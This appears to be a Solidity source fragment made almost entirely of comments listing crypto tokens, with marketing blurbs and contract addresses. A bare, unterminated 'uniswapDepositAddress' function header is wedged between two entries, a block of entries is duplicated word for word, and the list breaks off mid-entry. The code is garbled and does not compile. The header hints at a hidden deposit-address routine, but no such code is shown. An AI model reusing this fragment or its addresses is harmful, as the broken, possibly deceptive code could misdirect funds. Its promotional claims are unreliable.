// The Floki Inu protocol is a cross-chain community-driven token available on two blockchains: Ethereum (ETH) and Binance Smart Chain (BSC).
// 0xcf0c122c6b73ff809c693db761e7baebe62b6a2e

// Aurora (AURORA)
// Aurora is an EVM built on the NEAR Protocol, a solution for developers to operate their apps on an Ethereum-compatible, high-throughput, scalable and future-safe platform, with a fully trustless bridge architecture to connect Ethereum with other networks.
// 0xaaaaaa20d9e0e2461697782ef11675f668207961

// Token Prometeus Network (PROM)
// Prometeus Network fuels people-owned data markets, introducing new ways to interact with data and profit from it. They use a peer-to-peer approach to operate beyond any border or jurisdiction.
// 0xfc82bb4ba86045af6f327323a46e80412b91b27d

// Ankr Eth2 Reward Bearing Certificate (aETHc)
// Ankr's Eth2 staking solution provides the best user experience and highest level of safety, combined with an attractive reward mechanism and instant staking liquidity through a bond-like synthetic token called aETH.
// 0xE95A203B1a91a908F9B9CE46459d101078c2c3cb

// Numeraire (NMR)
// NMR is the scarcity token at the core of the Erasure Protocol. NMR cannot be minted and its core use is for staking and burning. The Erasure Protocol brings negative incentives to any website on the internet by providing users with economic skin in the game and punishing bad actors.
// 0x1776e1f26f98b1a5df9cd347953a26dd3cb46671

// RLC (RLC)
// Blockchain Based distributed cloud computing
// 0x607F4C5BB672230e8672085532f7e901544a7375

// Compound Basic Attention Token (cBAT)
// Compound is an open-source protocol for algorithmic, efficient Money Markets on the Ethereum blockchain.
// 0x6c8c6b02e7b2be14d4fa6022dfd6d75921d90e4e

// Bifrost (BFC)
// Bifrost is a multichain middleware platform that enables developers to create Decentralized Applications (DApps) on top of multiple protocols.
// 0x0c7D5ae016f806603CB1782bEa29AC69471CAb9c

// Boba Token (BOBA)
// Boba is an Ethereum L2 optimistic rollup that reduces gas fees, improves transaction throughput, and extends the capabilities of smart contracts through Hybrid Compute. Users of Boba’s native fast bridge can withdraw their funds in a few minutes instead of the usual 7 days required by other ORs.
// 0x42bbfa2e77757c645eeaad1655e0911a7553efbc

// AlphaToken (ALPHA)
// Alpha Finance Lab is an ecosystem of DeFi products and focused on building an ecosystem of automated yield-maximizing Alpha products that interoperate to bring optimal alpha to users on a cross-chain level.
// 0xa1faa113cbe53436df28ff0aee54275c13b40975

// SingularityNET Token (AGIX)
// Decentralized marketplace for artificial intelligence.
// 0x5b7533812759b45c2b44c19e320ba2cd2681b542

// Dusk Network (DUSK)
// Dusk streamlines the issuance of digital securities and automates trading compliance with the programmable and confidential securities.
// 0x940a2db1b7008b6c776d4faaca729d6d4a4aa551

// CocosToken (COCOS)
// The platform for the next generation of digital game economy.
// 0x0c6f5f7d555e7518f6841a79436bd2b1eef03381

// Beta Token (BETA)
// Beta Finance is a cross-chain permissionless money market protocol for lending, borrowing, and shorting crypto. Beta Finance has created an integrated “1-Click” Short Tool to initiate, manage, and close short positions, as well as allow anyone to create money markets for a token automatically.
// 0xbe1a001fe942f96eea22ba08783140b9dcc09d28

// USDK (USDK)
// USDK-Stablecoin Powered by Blockchain and US Licenced Trust Company
// 0x1c48f86ae57291f7686349f12601910bd8d470bb

// Veritaseum (VERI)
// Veritaseum builds blockchain-based, peer-to-peer capital markets as software on a global scale.
// 0x8f3470A7388c05eE4e7AF3d01D8C722b0FF52374

// mStable USD (mUSD)
// The mStable Standard is a protocol with the goal of making stablecoins and other tokenized assets easy, robust, and profitable.
// 0xe2f2a5c287993345a840db3b0845fbc70f5935a5

// Marlin POND (POND)
// Marlin is an open protocol that provides a high-performance programmable network infrastructure for Web 3.0
// 0x57b946008913b82e4df85f501cbaed910e58d26c

// Automata (ATA)
// Automata is a privacy middleware layer for dApps across multiple blockchains, built on a decentralized service protocol.
// 0xa2120b9e674d3fc3875f415a7df52e382f141225

// TrueFi (TRU)
// TrueFi is a DeFi protocol for uncollateralized lending powered by the TRU token. TRU Stakers to assess the creditworthiness of the loans
// 0x4c19596f5aaff459fa38b0f7ed92f11ae6543784

// Rupiah Token (IDRT)
// Rupiah Token (IDRT) is the first fiat-collateralized Indonesian Rupiah Stablecoin. Developed by PT Rupiah Token Indonesia, each IDRT is worth exactly 1 IDR.
// 0x998FFE1E43fAcffb941dc337dD0468d52bA5b48A

// Aergo (AERGO)
// Aergo is an open platform that allows businesses to build innovative applications and services by sharing data on a trustless and distributed IT ecosystem.
// 0x91Af0fBB28ABA7E31403Cb457106Ce79397FD4E6

// DODO bird (DODO)
// DODO is a on-chain liquidity provider, which leverages the Proactive Market Maker algorithm (PMM) to provide pure on-chain and contract-fillable liquidity for everyone.
// 0x43Dfc4159D86F3A37A5A4B3D4580b888ad7d4DDd

// Keep3rV1 (KP3R)
// Keep3r Network is a decentralized keeper network for projects that need external devops and for external teams to find keeper jobs.
// 0x1ceb5cb57c4d4e2b2433641b95dd330a33185a44

// ALICE (ALICE)
// My Neighbor Alice is a multiplayer builder game, where anyone can buy and own virtual islands, collect and build items and meet new friends.
// 0xac51066d7bec65dc4589368da368b212745d63e8

// Litentry (LIT)
// Litentry is a Decentralized Identity Aggregator that enables linking user identities across multiple networks.
// 0xb59490ab09a0f526cc7305822ac65f2ab12f9723

// Covalent Query Token (CQT)
// Covalent aggregates information from across dozens of sources including nodes, chains, and data feeds. Covalent returns this data in a rapid and consistent manner, incorporating all relevant data within one API interface.
// 0xd417144312dbf50465b1c641d016962017ef6240

// BitMartToken (BMC)
// BitMart is a globally integrated trading platform founded by a group of cryptocurrency enthusiasts.
// 0x986EE2B944c42D017F52Af21c4c69B84DBeA35d8

// Proton (XPR)
// Proton is a new public blockchain and dApp platform designed for both consumer applications and P2P payments. It is built around a secure identity and financial settlements layer that allows users to directly link real identity and fiat accounts, pull funds and buy crypto, and use crypto seamlessly.
// 0xD7EFB00d12C2c13131FD319336Fdf952525dA2af

// Aurora DAO (AURA)
// Aurora is a collection of Ethereum applications and protocols that together form a decentralized banking and finance platform.
// 0xcdcfc0f66c522fd086a1b725ea3c0eeb9f9e8814

// CarryToken (CRE)
// Carry makes personal data fair for consumers, marketers and merchants
// 0x115ec79f1de567ec68b7ae7eda501b406626478e

// LCX (LCX)
// LCX Terminal is made for Professional Cryptocurrency Portfolio Management
// 0x037a54aab062628c9bbae1fdb1583c195585fe41

// Gitcoin (GTC)
// GTC is a governance token with no economic value. GTC governs Gitcoin, where they work to decentralize grants, manage disputes, and govern the treasury.
// 0xde30da39c46104798bb5aa3fe8b9e0e1f348163f

// BOX Token (BOX)
// BOX offers a secure, convenient and streamlined crypto asset management system for institutional investment, audit risk control and crypto-exchange platforms.
// 0xe1A178B681BD05964d3e3Ed33AE731577d9d96dD

// Mainframe Token (MFT)
// The Hifi Lending Protocol allows users to borrow against their crypto. Hifi uses a bond-like instrument, representing an on-chain obligation that settles on a specific future date. Buying and selling the tokenized debt enables fixed-rate lending and borrowing.
// 0xdf2c7238198ad8b389666574f2d8bc411a4b7428

// UniBright (UBT)
// The unified framework for blockchain based business integration
// 0x8400d94a5cb0fa0d041a3788e395285d61c9ee5e

// QASH (QASH)
// We envision QASH to be the preferred payment token for financial services, like the Bitcoin for financial services. As more financial institutions, fintech startups and partners adopt QASH as a method of payment, the utility of QASH will scale, fueling the Fintech revolution.
// 0x618e75ac90b12c6049ba3b27f5d5f8651b0037f6

// AIOZ Network (AIOZ)
// The AIOZ Network is a decentralized content delivery network, which relies on multiple nodes spread out throughout the globe. These nodes provide computational-demanding resources like bandwidth, storage, and computational power in order to store content, share content and perform computing tasks.
// 0x626e8036deb333b408be468f951bdb42433cbf18

// Bluzelle (BLZ)
// Aims to be the next-gen database protocol for the decentralized internet.
// 0x5732046a883704404f284ce41ffadd5b007fd668

// Reserve (RSV)
// Reserve aims to create a stable decentralized currency targeted at emerging economies.
// 0x196f4727526eA7FB1e17b2071B3d8eAA38486988

// Presearch (PRE)
// Presearch is building a decentralized search engine powered by the community. Presearch utilizes its PRE cryptocurrency token to reward users for searching and to power its Keyword Staking ad platform.
// 0xEC213F83defB583af3A000B1c0ada660b1902A0F

// TORN Token (TORN)
// Tornado Cash is a fully decentralized protocol for private transactions on Ethereum.
// 0x77777feddddffc19ff86db637967013e6c6a116c

// Student Coin (STC)
// The idea of the project is to create a worldwide academically-focused cryptocurrency, supervised by university and research faculty, established by students for students. Student Coins are used to build a multi-university ecosystem of value transfer.
// 0x15b543e986b8c34074dfc9901136d9355a537e7e

// Melon Token (MLN)
// Enzyme is a way to build, scale, and monetize investment strategies
// 0xec67005c4e498ec7f55e092bd1d35cbc47c91892

// HOPR Token (HOPR)
// HOPR provides essential and compliant network-level metadata privacy for everyone. HOPR is an open incentivized mixnet which enables privacy-preserving point-to-point data exchange.
// 0xf5581dfefd8fb0e4aec526be659cfab1f8c781da

// DIAToken (DIA)
// DIA is delivering verifiable financial data from traditional and crypto sources to its community.
// 0x84cA8bc7997272c7CfB4D0Cd3D55cd942B3c9419

// EverRise (RISE)
// EverRise is a blockchain technology company that offers bridging and security solutions across blockchains through an ecosystem of decentralized applications. The EverRise token (RISE) is a multi-chain, collateralized cryptocurrency that powers the EverRise dApp ecosystem.
// 0xC17c30e98541188614dF99239cABD40280810cA3

// Refereum (RFR)
// Distribution and growth platform for games.
// 0xd0929d411954c47438dc1d871dd6081f5c5e149c


// bZx Protocol Token (BZRX)
// BZRX token.
// 0x56d811088235F11C8920698a204A5010a788f4b3

// CoinDash Token (CDT)
// Blox is an open-source, fully non-custodial staking platform for Ethereum 2.0. Their goal at Blox is to simplify staking while ensuring Ethereum stays fair and decentralized.
// 0x177d39ac676ed1c67a2b268ad7f1e58826e5b0af

// Nectar (NCT)
// Decentralized marketplace where security experts build anti-malware engines that compete to protect you.
// 0x9e46a38f5daabe8683e10793b06749eef7d733d1

// Wirex Token (WXT)
// Wirex is a worldwide digital payment platform and regulated institution endeavoring to make digital money accessible to everyone. XT is a utility token and used as a backbone for Wirex's reward system called X-Tras
// 0xa02120696c7b8fe16c09c749e4598819b2b0e915

// FOX (FOX)
// FOX is ShapeShift’s official loyalty token. Holders of FOX enjoy zero-commission trading and win ongoing USDC crypto payments from Rainfall (payments increase in proportion to your FOX holdings). Use at ShapeShift.com.
// 0xc770eefad204b5180df6a14ee197d99d808ee52d

// Tellor Tributes (TRB)
// Tellor is a decentralized oracle that provides an on-chain data bank where staked miners compete to add the data points.
// 0x88df592f8eb5d7bd38bfef7deb0fbc02cf3778a0

// OVR (OVR)
// OVR ecosystem allow users to earn by buying, selling or renting OVR Lands or just by stacking OVR Tokens while content creators can earn building and publishing AR experiences.
// 0x21bfbda47a0b4b5b1248c767ee49f7caa9b23697

// Ampleforth Governance (FORTH)
// FORTH is the governance token for the Ampleforth protocol. AMPL is the first rebasing currency and a key DeFi building block for denominating stable contracts.
// 0x77fba179c79de5b7653f68b5039af940ada60ce0

// Moss Coin (MOC)
// Location-based Augmented Reality Mobile Game based on Real Estate
// 0x865ec58b06bf6305b886793aa20a2da31d034e68

// ICONOMI (ICN)
// ICONOMI Digital Assets Management platform enables simple access to a variety of digital assets and combined Digital Asset Arrays
// 0x888666CA69E0f178DED6D75b5726Cee99A87D698

// Kin (KIN)
// The vision for Kin is rooted in the belief that a participants can come together to create an open ecosystem of tools for digital communication and commerce that prioritizes consumer experience, fair and user-oriented model for digital services.
// 0x818fc6c2ec5986bc6e2cbf00939d90556ab12ce5

// Cortex Coin (CTXC)
// Decentralized AI autonomous system.
// 0xea11755ae41d889ceec39a63e6ff75a02bc1c00d

// SpookyToken (BOO)
// SpookySwap is an automated market-making (AMM) decentralized exchange (DEX) for the Fantom Opera network.
// 0x55af5865807b196bd0197e0902746f31fbccfa58

// BZ (BZ)
// Digital asset trading exchanges, providing professional digital asset trading and OTC (Over The Counter) services.
// 0x4375e7ad8a01b8ec3ed041399f62d9cd120e0063

// Adventure Gold (AGLD)
// Adventure Gold is the native ERC-20 token of the Loot non-fungible token (NFT) project. Loot is a text-based, randomized adventure gear generated and stored on-chain, created by social media network Vine co-founder Dom Hofmann.
// 0x32353A6C91143bfd6C7d363B546e62a9A2489A20

// Decentral Games (DG)
// Decentral Games is a community-owned metaverse casino ecosystem powered by DG.
// 0x4b520c812e8430659fc9f12f6d0c39026c83588d

// SENTINEL PROTOCOL (UPP)
// Sentinel Protocol is a blockchain-based threat intelligence platform that defends against hacks, scams, and fraud using crowdsourced threat data collected by security experts; called the Sentinels.
// 0xc86d054809623432210c107af2e3f619dcfbf652

// MATH Token (MATH)
// Crypto wallet.
// 0x08d967bb0134f2d07f7cfb6e246680c53927dd30

// SelfKey (KEY)
// SelfKey is a blockchain based self-sovereign identity ecosystem that aims to empower individuals and companies to find more freedom, privacy and wealth through the full ownership of their digital identity.
// 0x4cc19356f2d37338b9802aa8e8fc58b0373296e7

// RHOC (RHOC)
// The RChain Platform aims to be a decentralized, economically sustainable public compute infrastructure.
// 0x168296bb09e24a88805cb9c33356536b980d3fc5

// THORSwap Token (THOR)
// THORswap is a multi-chain DEX aggregator built on THORChain's cross-chain liquidity protocol for all THORChain services like THORNames and synthetic assets.
// 0xa5f2211b9b8170f694421f2046281775e8468044

// Somnium Space Cubes (CUBE)
// We are an open, social & persistent VR world built on blockchain. Buy land, build or import objects and instantly monetize. Universe shaped entirely by players!
// 0xdf801468a808a32656d2ed2d2d80b72a129739f4

// Parsiq Token (PRQ)
// A Blockchain monitoring and compliance platform.
// 0x362bc847A3a9637d3af6624EeC853618a43ed7D2

// EthLend (LEND)
// Aave is an Open Source and Non-Custodial protocol to earn interest on deposits & borrow assets. It also features access to highly innovative flash loans, which let developers borrow instantly and easily; no collateral needed. With 16 different assets, 5 of which are stablecoins.
// 0x80fB784B7eD66730e8b1DBd9820aFD29931aab03

// QANX Token (QANX)
// Quantum-resistant hybrid blockchain platform. Build your software applications like DApps or DeFi and run business processes on blockchain in 5 minutes with QANplatform.
// 0xaaa7a10a8ee237ea61e8ac46c50a8db8bcc1baaa

// LockTrip (LOC)
// Hotel Booking & Vacation Rental Marketplace With 0% Commissions.
// 0x5e3346444010135322268a4630d2ed5f8d09446c

// BioPassport Coin (BIOT)
// BioPassport is committed to help make healthcare a personal component of our daily lives. This starts with a 'health passport' platform that houses a patient's DPHR, or decentralized personal health record built around DID (decentralized identity) technology.
// 0xc07A150ECAdF2cc352f5586396e344A6b17625EB

// MANTRA DAO (OM)
// MANTRA DAO is a community-governed DeFi platform focusing on Staking, Lending, and Governance.
// 0x3593d125a4f7849a1b059e64f4517a86dd60c95d

// Sai Stablecoin v1.0 (SAI)
// Sai is an asset-backed, hard currency for the 21st century. The first decentralized stablecoin on the Ethereum blockchain.
// 0x89d24a6b4ccb1b6faa2625fe562bdd9a23260359

// Rarible (RARI)
// Create and sell digital collectibles secured with blockchain.
// 0xfca59cd816ab1ead66534d82bc21e7515ce441cf

// BTRFLY (BTRFLY)
// 0xc0d4ceb216b3ba9c3701b291766fdcba977cec3a

// AVT (AVT)
// An open-source protocol that delivers the global standard for ticketing.
// 0x0d88ed6e74bbfd96b831231638b66c05571e824f

// Fusion (FSN)
// FUSION is a public blockchain devoting itself to creating an inclusive cryptofinancial platform by providing cross-chain, cross-organization, and cross-datasource smart contracts.
// 0xd0352a019e9ab9d757776f532377aaebd36fd541

// BarnBridge Governance Token (BOND)
function uniswapDepositAddress() public pure returns (address) {
// BarnBridge aims to offer a cross platform protocol for tokenizing risk.
// 0x0391D2021f89DC339F60Fff84546EA23E337750f

// Nuls (NULS)
// NULS is a blockchain built on an infrastructure optimized for customized services through the use of micro-services. The NULS blockchain is a public, global, open-source community project. NULS uses the micro-service functionality to implement a highly modularized underlying architecture.
// 0xa2791bdf2d5055cda4d46ec17f9f429568275047

// Pinakion (PNK)
// Kleros provides fast, secure and affordable arbitration for virtually everything.
// 0x93ed3fbe21207ec2e8f2d3c3de6e058cb73bc04d

// LON Token (LON)
// Tokenlon is a decentralized exchange and payment settlement protocol.
// 0x0000000000095413afc295d19edeb1ad7b71c952

// CargoX (CXO)
// CargoX aims to be the independent supplier of blockchain-based Smart B/L solutions that enable extremely fast, safe, reliable and cost-effective global Bill of Lading processing.
// 0xb6ee9668771a79be7967ee29a63d4184f8097143

// Wrapped NXM (wNXM)
// Blockchain based solutions for smart contract cover.
// 0x0d438f3b5175bebc262bf23753c1e53d03432bde

// Bytom (BTM)
// Transfer assets from atomic world to byteworld
// 0xcb97e65f07da24d46bcdd078ebebd7c6e6e3d750

// EthLend (LEND)
// Aave is an Open Source and Non-Custodial protocol to earn interest on deposits & borrow assets. It also features access to highly innovative flash loans, which let developers borrow instantly and easily; no collateral needed. With 16 different assets, 5 of which are stablecoins.
// 0x80fB784B7eD66730e8b1DBd9820aFD29931aab03

// QANX Token (QANX)
// Quantum-resistant hybrid blockchain platform. Build your software applications like DApps or DeFi and run business processes on blockchain in 5 minutes with QANplatform.
// 0xaaa7a10a8ee237ea61e8ac46c50a8db8bcc1baaa

// LockTrip (LOC)
// Hotel Booking & Vacation Rental Marketplace With 0% Commissions.
// 0x5e3346444010135322268a4630d2ed5f8d09446c

// BioPassport Coin (BIOT)
// BioPassport is committed to help make healthcare a personal component of our daily lives. This starts with a 'health passport' platform that houses a patient's DPHR, or decentralized personal health record built around DID (decentralized identity) technology.
// 0xc07A150ECAdF2cc352f5586396e344A6b17625EB

// MANTRA DAO (OM)
// MANTRA DAO is a community-governed DeFi platform focusing on Staking, Lending, and Governance.
// 0x3593d125a4f7849a1b059e64f4517a86dd60c95d

// Sai Stablecoin v1.0 (SAI)
// Sai is an asset-backed, hard currency for the 21st century. The first decentralized stablecoin on the Ethereum blockchain.
// 0x89d24a6b4ccb1b6faa2625fe562bdd9a23260359

// Rarible (RARI)
// Create and sell digital collectibles secured with blockchain.
// 0xfca59cd816ab1ead66534d82bc21e7515ce441cf

// BTRFLY (BTRFLY)
// 0xc0d4ceb216b3ba9c3701b291766fdcba977cec3a

// AVT (AVT)
// An open-source protocol that delivers the global standard for ticketing.
// 0x0d88ed6e74bbfd96b831231638b66c05571e824f

// Fusion (FSN)
// FUSION is a public blockchain devoting itself to creating an inclusive cryptofinancial platform by providing cross-chain, cross-organization, and cross-datasource smart contracts.
// 0xd0352a019e9ab9d757776f532377aaebd36fd541

// BarnBridge Governance Token (BOND)
// BarnBridge aims to offer a cross platform protocol for tokenizing risk.
// 0x0391D2021f89DC339F60Fff84546EA23E337750f

// Nuls (NULS)
// NULS is a blockchain built on an infrastructure optimized for customized services through the use of micro-services. The NULS blockchain is a public, global, open-source community project. NULS uses the micro-service functionality to implement a highly modularized underlying architecture.
// 0xa2791bdf2d5055cda4d46ec17f9f429568275047

// Pinakion (PNK)
// Kleros provides fast, secure and affordable arbitration for virtually everything.
// 0x93ed3fbe21207ec2e8f2d3c3de6e058cb73bc04d

// LON Token (LON)
// Tokenlon is a decentralized exchange and payment settlement protocol.
// 0x0000000000095413afc295d19edeb1ad7b71c952

// CargoX (CXO)
// CargoX aims to be the independent supplier of blockchain-based Smart B/L solutions that enable extremely fast, safe, reliable and cost-effective global Bill of Lading processing.
// 0xb6ee9668771a79be7967ee29a63d4184f8097143

// Wrapped NXM (wNXM)
// Blockchain based solutions for smart contract cover.
// 0x0d438f3b5175bebc262bf23753c1e53d03432bde

// Bytom (BTM)
// Transfer assets from atomic world to byteworld
// 0xcb97e65f07da24d46bcdd078ebebd7c6e6e3d750

// Measurable Data Token (MDT)
// Decentralized Data Exchange Economy.
// 0x814e0908b12a99fecf5bc101bb5d0b8b5cdf7d26

// Pluton (PLU)
// With Plutus Tap & Pay, you can pay at any NFC-enabled merchant
// 0xD8912C10681D8B21Fd3742244f44658dBA12264E

// Frontier Token (FRONT)
// Frontier is a chain-agnostic DeFi aggregation layer. To date, they have added support for DeFi on Ethereum, Binance Chain, BandChain, Kava, and Harmony. Via StaFi Protocol, they will enter into the Polkadot ecosystem, and will now put vigorous efforts towards Serum.
// 0xf8C3527CC04340b208C854E985240c02F7B7793f

// Quantstamp (QSP)
// QSP is an ERC-20 token used for verifying smart contracts on the decentralized QSP Security Protocol. Users can buy automated scans of smart contracts with QSP, and validators can earn QSP for helping provide decentralized security scans on the network at protocol.quantstamp.com.
// 0x99ea4db9ee77acd40b119bd1dc4e33e1c070b80d

// FEGtoken (FEG)
// FEG is an experimental progressive deflationary DeFi token whereby on each transcation, a tax of 1% will be distributed to the holders and a further 1% will be burnt, hence incentivising holders to hodl and decreasing the supply overtime.
// 0x389999216860ab8e0175387a0c90e5c52522c945

// BOSAGORA (BOA)
// Transitional token for the BOSAgora platform
// 0x746dda2ea243400d5a63e0700f190ab79f06489e

// NAGA Coin (NGC)
// The NAGA CARD allows you to fund with cryptos and spend your money (online/offline) all around the globe.
// 0x72dd4b6bd852a3aa172be4d6c5a6dbec588cf131

// dForce (DF)
// DF is the platform utility token of the dForce network to be used for transaction services, community governance, system stabilizer, incentivization, validator deposit when we migrate to staking model, and etc.
// 0x431ad2ff6a9c365805ebad47ee021148d6f7dbe0

// WaykiCoin (WIC)
// WaykiChain aims to build the blockchain 3.0 commercial public chain, provide enterprise-level blockchain infrastructure and industry solutions, and create a new business model in the new era.
// 0x4f878c0852722b0976a955d68b376e4cd4ae99e5

// CRPT (CRPT)
// Crypterium is building a mobile app that lets users spend cryptocurrency in everyday life.
// 0x08389495d7456e1951ddf7c3a1314a4bfb646d8b

// Decentral Games Governance (xDG)
// Decentral Games is a community-owned metaverse casino ecosystem powered by DG.
// 0x4f81c790581b240a5c948afd173620ecc8c71c8d

// Shiden (SDN)
// Shiden Network is a multi-chain decentralized application layer on Kusama Network.
// 0x00e856ee945a49bb73436e719d96910cd9d116a4

// Guaranteed Entrance Token (GET)
// The GET Protocol offers a blockchain-based smart ticketing solution that can be used by everybody who needs to issue admission tickets in an honest and transparent way.
// 0x8a854288a5976036a725879164ca3e91d30c6a1b

// Fuse Token (FUSE)
// Fuse is a no-code smart contract platform for entrepreneurs that allows entrepreneurs to integrate everyday payments into their business.
// 0x970b9bb2c0444f5e81e9d0efb84c8ccdcdcaf84d

// Instadapp (INST)
// Instadapp is an open source and non-custodial middleware platform for decentralized finance applications.
// 0x6f40d4a6237c257fff2db00fa0510deeecd303eb

// Blockport (BPT)
// Social crypto exchange based on a hybrid-decentralized architecture.
// 0x327682779bab2bf4d1337e8974ab9de8275a7ca8

// Kryll (KRL)
// A Crypto Traders Community
// 0x464ebe77c293e473b48cfe96ddcf88fcf7bfdac0

// Ultiledger (ULT)
// Credit circulation, Asset circulation, Value circulation. The next generation global self-financing blockchain protocol.
// 0xe884cc2795b9c45beeac0607da9539fd571ccf85

// UTN-P: Universa Token (UTNP)
// The Universa blockchain is a cooperative ledger of state changes, performed by licensed and trusted nodes.
// 0x9e3319636e2126e3c0bc9e3134aec5e1508a46c7

// Route (ROUTE)
// Router Protocol is a crosschain-liquidity aggregator platform that was built to seamlessly provide bridging infrastructure between current and emerging Layer 1 and Layer 2 blockchain solutions.
// 0x16eccfdbb4ee1a85a33f3a9b21175cd7ae753db4

// Dock (DOCK)
// dock.io is a decentralized data exchange protocol that lets people connect their profiles, reputations and experiences across the web with privacy and security.
// 0xe5dada80aa6477e85d09747f2842f7993d0df71c

// BetProtocolToken (BEPRO)
// BetProtocol enables entrepreneurs and developers to create gaming platforms in minutes. No coding required.
// 0xcf3c8be2e2c42331da80ef210e9b1b307c03d36a

// QRL (QRL)
// The Quantum Resistant Ledger (QRL) aims to be a future-proof post-quantum value store and decentralized communication layer which tackles the threat Quantum Computing will pose to cryptocurrencies.
// 0x697beac28b09e122c4332d163985e8a73121b97f

// StackOS (STACK)
// StackOS is an open protocol that allows individuals to collectively offer a decentralized cloud where you can deploy any full-stack application, decentralized app, blockchain privatenets, and mainnet nodes.
// 0x56a86d648c435dc707c8405b78e2ae8eb4e60ba4

// Yuan Chain New (YCC)
// 0x37e1160184f7dd29f00b78c050bf13224780b0b0

// GRID (GRID)
// Grid+ creates products that enable mainstream use of digital assets and cryptocurrencies. Grid+ strives to be the hardware, software, and cryptocurrency experts building the foundation for a more efficient and inclusive financial future.
// 0x12b19d3e2ccc14da04fae33e63652ce469b3f2fd

// DEXTools (DEXT)
// DEXTools is a trading assistan platform with which you can access features such as Token Catcher, Spreader, Ob search and more.
// 0xfb7b4564402e5500db5bb6d63ae671302777c75a

// SAN (SAN)
// A Better Way to Trade Crypto-Markets - Market Datafeeds, Newswires, and Crowd Sentiment Insights for the Blockchain World
// 0x7c5a0ce9267ed19b22f8cae653f198e3e8daf098

// TE-FOOD/TustChain (TONE)
// A food traceability solution.
// 0x2Ab6Bb8408ca3199B8Fa6C92d5b455F820Af03c4

// hoge.finance (HOGE)
// The HOGE token has a 2% tax on each transaction. One trillion tokens were minted for the initial supply. Half of the tokens were immediately burned. Burning the initial supply balanced the starting transactions. It ensured redistribution was proportionally weighted among wallet holders.
// 0xfad45e47083e4607302aa43c65fb3106f1cd7607

// Civilization (CIV)
// CIV is a Dex Fund that developed for transforming staking and investment. Auditable automated code, community-driven, multi-strategy trading for maximum yield at minimum risk.
// 0x37fe0f067fa808ffbdd12891c0858532cfe7361d

// ELYSIA (EL)
// Elysia connects real estate buyers and sellers around the world. At Elysia, anyone can buy and sell fractions of real estate properties and receive equal ownership interest. $EL is used for various transactions inside the platform and EL is used to pay fees will be burned on a quarterly basis.
// 0x2781246fe707bb15cee3e5ea354e2154a2877b16

// Gifto (GTO)
// Decentralized Universal Gifting Protocol.
// 0xc5bbae50781be1669306b9e001eff57a2957b09d

// AOG (AOG)
// Smartofgiving (AOG) is an idea-turned-reality that envisioned a unique model to generate funds for charities without asking for monetary donation.
// 0x8578530205cecbe5db83f7f29ecfeec860c297c2

// ANGLE (ANGLE)
// Angle is an over-collateralized, decentralized and capital-efficient stablecoin protocol.
// 0x31429d1856ad1377a8a0079410b297e1a9e214c2

// RAE Token (RAE)
// Receive Access Ecosystem (RAE) token gives content creators a drop-dead easy way to tap into subscription revenue and digital network effects.
// 0xe5a3229ccb22b6484594973a03a3851dcd948756

// ParaSwap (PSP)
// ParaSwap aggregates decentralized exchanges and other DeFi services in one comprehensive interface to streamline and facilitate users' interactions with decentralized finance on Ethereum and EVM-compatible chains: Polygon, Avalanche, BSC & more to come.
// 0xcafe001067cdef266afb7eb5a286dcfd277f3de5

// AirSwap (AST)
// AirSwap is based on the Swap protocol, a peer-to-peer protocol for trading Ethereum tokens
// 0x27054b13b1b798b345b591a4d22e6562d47ea75a

// Metronome (MET)
// A new cryptocurrency focused on making greater decentralization possible and delivering institutional-class endurance.
// 0xa3d58c4e56fedcae3a7c43a725aee9a71f0ece4e

// NimiqNetwork (NET)
// A Browser-based Blockchain & Ecosystem
// 0xcfb98637bcae43C13323EAa1731cED2B716962fD

// VISOR (VISR)
// Ability to interact with DeFi protocols through an NFT in order to enhance the discovery, reputation, safety and programmability of on-chain liquidity.
// 0xf938424f7210f31df2aee3011291b658f872e91e

// Imported GBYTE (GBYTE)
// Obyte is a distributed ledger based on directed acyclic graph (DAG). Unlike centralized ledgers and blockchains, access to Obyte ledger is decentralized, disintermediated, free (as in freedom), equal, and open.
// 0x31f69de127c8a0ff10819c0955490a4ae46fcc2a

// pNetwork Token (PNT)
// pNetwork is the heartbeat of cross-chain composability. As the governance network for the pTokens system, it enables the seamless movement of assets across blockchains.
// 0x89Ab32156e46F46D02ade3FEcbe5Fc4243B9AAeD

// UniLend Finance Token (UFT)
// UniLend is a permission-less decentralized protocol that combines spot trading services and money markets with lending and services through smart contracts.
// 0x0202Be363B8a4820f3F4DE7FaF5224fF05943AB1

// Stake DAO Token (SDT)
// Stake DAO offers a simple solution for staking a variety of tokens all from one dashboard. Users can search through the best of DeFi and choose from the best products to help them beat the market.
// 0x73968b9a57c6e53d41345fd57a6e6ae27d6cdb2f

// NUM Token (NUM)
// Numbers protocol is a decentralised photo network, for creating community, value and trust in digital media.
// 0x3496b523e5c00a4b4150d6721320cddb234c3079

// Eden (EDEN)
// Eden is a priority transaction network that protects traders from frontrunning, aligns incentives for block producers, and redistributes miner extractable value.
// 0x1559fa1b8f28238fd5d76d9f434ad86fd20d1559

// SwftCoin (SWFTC)
// SWFT is a cross-blockchain platform.
// 0x0bb217e40f8a5cb79adf04e1aab60e5abd0dfc1e

// Dragon (DRGN)
// Dragonchain simplifies the integration of real business applications onto a blockchain.
// 0x419c4db4b9e25d6db2ad9691ccb832c8d9fda05e

// UniCrypt (UNCX)
// UniCrypt is a platform creating services for other tokens. Services such as token locking contracts, yield farming as a service and other dex orientated products.
// 0xaDB2437e6F65682B85F814fBc12FeC0508A7B1D0

// OCC (OCC)
// A decentralized launchpad and exchange designed for the Cardano ecosystem.
// 0x2f109021afe75b949429fe30523ee7c0d5b27207

// STAKE (STAKE)
// STAKE is a new ERC20 token designed to secure the on-chain payment layer and provide a mechanism for validators to receive incentives.
// 0x0Ae055097C6d159879521C384F1D2123D1f195e6

// Shyft [ Wrapped ] (SHFT)
// Shyft Network is a public protocol designed to aggregate and embed trust, validation, and discoverability into data stored on public and private ecosystems.
// 0xb17c88bda07d28b3838e0c1de6a30eafbcf52d85

// Switcheo Token (SWTH)
// Switcheo offers a cross-chain trading protocol for any asset and its derivatives.
// 0xb4371da53140417cbb3362055374b10d97e420bb

// Interest Compounding ETH Index (icETH)
// The Interest Compounding ETH Index from the Index Coop enhances staking returns with a leveraged liquid staking strategy. icETH multiplies the staking rate for stETH while minimizing transaction costs and risk associated with maintaining collateralized debt in Aave.
// 0x7c07f7abe10ce8e33dc6c5ad68fe033085256a84

// veCRV-DAO yVault (yveCRV-DAO)
// 0xc5bddf9843308380375a611c18b50fb9341f502a

// Coinvest COIN V3 Token (COIN)
// Coinvest is a trading platform (and market maker) where you make investment transactions and redeem profit from your trades through a process that is decentralized and handled by smart contracts.
// 0xeb547ed1D8A3Ff1461aBAa7F0022FED4836E00A4

// Cashaa (CAS)
